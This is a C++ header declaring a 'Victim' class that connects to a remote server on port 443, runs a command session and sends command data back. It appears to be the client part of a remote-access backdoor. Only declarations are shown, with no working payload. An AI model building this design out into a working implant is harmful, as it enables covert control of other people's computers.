#include <SFML/Network.hpp>
#include <thread>
#include "cmdSession.hpp"

class Victim {
public:
	Victim(std::string inHId);
	int runVictimProcess();

private:
	bool connectServer();

	void sendCmdData();

	sf::TcpSocket server;
	std::string myHId = "";
	int16_t myId = 0;
	uint16_t requestId = 1;

	std::thread* sendCmdDataThread = nullptr;
	CmdSession* cmdSession = nullptr;
	sf::IpAddress serverIp = sf::IpAddress(0, 0, 0, 0);
	short serverPort = 443;

	bool isInitialized = false;
	bool isSshActive = false;
};